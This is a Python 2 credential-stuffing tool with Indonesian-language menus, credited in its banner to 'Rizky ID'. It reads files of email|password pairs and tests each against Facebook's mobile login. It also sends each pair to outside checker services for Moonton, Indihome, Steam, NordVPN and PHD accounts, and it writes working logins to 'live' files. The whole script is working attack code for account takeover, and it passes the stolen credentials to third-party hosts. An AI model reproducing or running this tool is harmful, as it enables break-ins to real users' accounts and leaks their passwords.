#!/usr/lib/python2.7
# _*_ coding: UTF-8 _*_
try:
    import os, sys, requests, json, random
except Exception as e:
    os.system('pip2 install requests')

agent = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'
hijau = '\x1b[1;92m'
cyan  = '\x1b[1;96m'
kuning= '\x1b[1;93m'
ungu  = '\x1b[1;95m'
putih = '\x1b[1;97m'
biru  = '\x1b[1;94m'
merah = '\x1b[1;91m'
gelap = '\x1b[0;37m'
warna = random.choice([hijau,cyan,biru,merah])
logo  = """%s╔═╗%s┌┬┐┌─┐┌─┐┌─┐  %s╔═╗%s┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
%s║╣ %s│││├─┘├─┤└─┐  %s║  %s├─┤├┤ │  ├┴┐├┤ ├┬┘
%s╚═╝%s┴ ┴┴  ┴ ┴└─┘  %s╚═╝%s┴ ┴└─┘└─┘┴ ┴└─┘┴└─
%s+--={ %sAuthor%s: %sRizky ID
%s+--={ %sGithub%s: %sgithub.com/hekelpro
"""%(warna,putih,warna,putih,warna,putih,warna,putih,warna,putih,warna,putih,merah,putih,merah,hijau,merah,putih,merah,hijau)
def main():
    os.system('clear')
    print logo
    print '      %s+-----={ %sMain Menu %s}=-----+'%(merah,putih,merah)
    print '      %s[%s01%s]%s Empas Moonton Checker'%(hijau,hijau,putih,biru)
    print '      %s[%s02%s]%s Empas Facebook Checker'%(putih,hijau,putih,gelap)
    print '      %s[%s03%s]%s Empas Checker Indihome'%(putih,hijau,putih,gelap)
    print '      %s[%s04%s]%s Empas Steam Checker'%(putih,hijau,putih,gelap)
    print '      %s[%s05%s]%s Empas NordVPN Checker'%(putih,hijau,putih,gelap)
    print '      %s[%s06%s]%s Empas PHD Checker'%(putih,hijau,putih,gelap)
    print '      %s[%s00%s]%s Exit\n'%(putih,merah,putih,merah);pilih()
def pilih():
    try:
        ch = raw_input('%s+--={ %sPilih Menu%s:%s '%(merah,putih,merah,hijau))
        if ch =='':
           print '%s[%s!%s] %sJangan Kosong'%(putih,merah,putih,merah)
           pilih()
        elif ch =='1' or ch =='01':
            ml()
        elif ch =='2' or ch =='02':
            fb()
        elif ch =='3' or ch =='03':
            idh()
        elif ch =='4' or ch =='04':
            steam()
        elif ch =='5' or ch =='05':
            vpn()
        elif ch =='6' or ch =='06':
            phd()
        elif ch =='0' or ch =='00':
            print '%s[%s!%s] %sExit'%(putih,merah,putih,merah);exit()
        else:
            print "%s[%s!%s] Menu '%s%s%s' Tidak Ada"%(putih,merah,putih,merah,ch,putih)
            pilih()
    except (KeyboardInterrupt, EOFError):
        print '\n%s[%s!%s]%s CTRL+Z %sUntuk Exit'%(putih,merah,putih,merah,putih)
        pilih()
def ml():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    target@email.com|password'%(putih,merah,putih,gelap)
    try:
        buka = open(raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')).read().splitlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    for mpsh in buka:
        gay = requests.post('https://jogosuroboyo2407.com/sby/pages/foto_kriminal/ml.php',headers={'user-agent':agent},data={'empaslist':mpsh,'delimiter':'|'})
        if 'HTML' in gay.text:
            print '%s[%s•%s] %sWeb Di Protek cloudflare'%(putih,merah,putih,merah);exit()
        elif 'live' in gay.text:
            print '      %s[%sLIVE%s] %s%s'%(putih,hijau,putih,gelap,mpsh)
            open("live_ml.txt","a+").write(mpsh+"\n")
        else:
            print '      %s[%sDIEE%s] %s%s'%(putih,merah,putih,gelap,mpsh)
    print
    print '%s[%s✓%s] Result %s=>%s live_ml.txt'%(putih,hijau,putih,merah,putih)
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()
def fb():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    username|password'%(putih,merah,putih,gelap)
    try:
        file = raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')
        list = open(file, 'r').readlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    delimeter = "|"
    for meki in list:
        username, password = meki.strip().split(str(delimeter))
        link = 'https://mobile.facebook.com/login.php'
        headers = {
                  'User-Agent':agent,
                  'Accept-Language' : 'en-US,en;q=0.5'
                  }
        data = {
               'email':username,
               'pass': password
               }
        mpsh = requests.post(link, headers=headers, data=data).text
        if 'xc_message' in mpsh:
            print '      %s[%sLIVE%s] \x1b[1;97m%s\x1b[0;37m | \x1b[1;97m%s'%(putih,hijau,putih,username,password)
            open("live_FB.txt","a+").write('live => '+username+'|'+password+'\n')
        elif "checkpointSubmitButton-actual-button" in mpsh:
            print '      %s[%sCHEK%s] \x1b[1;97m%s\x1b[0;37m | \x1b[1;97m%s'%(putih,kuning,putih,username,password)
        elif 'login_error' in mpsh:
            print '      %s[%sDIEE%s] \x1b[1;97m%s\x1b[0;37m | \x1b[1;97m%s'%(putih,merah,putih,username,password)
        else:
            print '      %s[%sDIEE%s] \x1b[1;97m%s\x1b[0;37m | \x1b[1;97m%s'%(putih,merah,putih,username,password)

    print
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()
def idh():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    target@email.com|password'%(putih,merah,putih,gelap)
    try:
        buka = open(raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')).read().splitlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    for mpsh in buka:
        gay = requests.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/indihome.php',headers={'user-agent':agent},data={'empaslist':mpsh,'delimiter':'|'})
        if 'HTML' in gay.text:
            print '%s[%s•%s] %sWeb Di Protek cloudflare'%(putih,merah,putih,merah);exit()
        elif 'live' in gay.text:
            print '      %s[%sLIVE%s] %s%s'%(putih,hijau,putih,gelap,mpsh)
            open("live_indihome.txt","a+").write(mpsh+"\n")
        else:
            print '      %s[%sDIEE%s] %s%s'%(putih,merah,putih,gelap,mpsh)
    print
    print '%s[%s✓%s] Result %s=>%s live_indihome.txt'%(putih,hijau,putih,merah,putih)
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()
def steam():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    target@email.com|password'%(putih,merah,putih,gelap)
    try:
        buka = open(raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')).read().splitlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    for mpsh in buka:
        gay = requests.post('https://nabil.my.id/api/steamcheck',headers={'user-agent':agent},data={'userpasslist':mpsh,'delimiter':'|'})
        if 'HTML' in gay.text:
            print '%s[%s•%s] %sWeb Di Protek cloudflare'%(putih,merah,putih,merah);exit()
        elif 'live' in gay.text:
            print '      %s[%sLIVE%s] %s%s'%(putih,hijau,putih,gelap,mpsh)
            open("live_steam.txt","a+").write(mpsh+"\n")
        else:
            print '      %s[%sDIEE%s] %s%s'%(putih,merah,putih,gelap,mpsh)
    print
    print '%s[%s✓%s] Result %s=>%s live_steam.txt'%(putih,hijau,putih,merah,putih)
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()
def vpn():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    target@email.com|password'%(putih,merah,putih,gelap)
    try:
        buka = open(raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')).read().splitlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    for mpsh in buka:
        gay = requests.post('https://nabil.my.id/api/nordvpncheck',headers={'user-agent':agent},data={'empaslist':mpsh,'delimiter':'|'})
        if 'HTML' in gay.text:
            print '%s[%s•%s] %sWeb Di Protek cloudflare'%(putih,merah,putih,merah);exit()
        elif 'hasillive' in gay.text:
            print '      %s[%sLIVE%s] %s%s'%(putih,hijau,putih,gelap,mpsh)
            open("live_vpn.txt","a+").write(mpsh+"\n")
        else:
            print '      %s[%sDIEE%s] %s%s'%(putih,merah,putih,gelap,mpsh)
    print
    print '%s[%s✓%s] Result %s=>%s live_vpn.txt'%(putih,hijau,putih,merah,putih)
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()
def phd():
    os.system('clear')
    print logo
    print '%s[%s!%s] %sMasukan File.txt Yang Berisi\n    target@email.com|password'%(putih,merah,putih,gelap)
    try:
        buka = open(raw_input('\x1b[1;97m[\x1b[1;92m=\x1b[1;97m] File\x1b[1;91m:\x1b[1;92m ')).read().splitlines()
    except IOError:
        print '%s[%s+%s] %sFile Tidak Ditemukan'%(putih,merah,putih,gelap)
        raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
        main()
    print
    for mpsh in buka:
        gay = requests.post('https://nabil.my.id/api/phdcheck',headers={'user-agent':agent},data={'empaslist':mpsh,'delimiter':'|'})
        if 'HTML' in gay.text:
            print '%s[%s•%s] %sWeb Di Protek cloudflare'%(putih,merah,putih,merah);exit()
        elif 'hasillive' in gay.text:
            print '      %s[%sLIVE%s] %s%s'%(putih,hijau,putih,gelap,mpsh)
            open("live_phd.txt","a+").write(mpsh+"\n")
        else:
            print '      %s[%sDIEE%s] %s%s'%(putih,merah,putih,gelap,mpsh)
    print
    print '%s[%s✓%s] Result %s=>%s live_phd.txt'%(putih,hijau,putih,merah,putih)
    raw_input('\n%s+--={ %sEnter Untuk Kembali %s}=--+ '%(merah,putih,merah))
    main()

if __name__=='__main__':
	main()
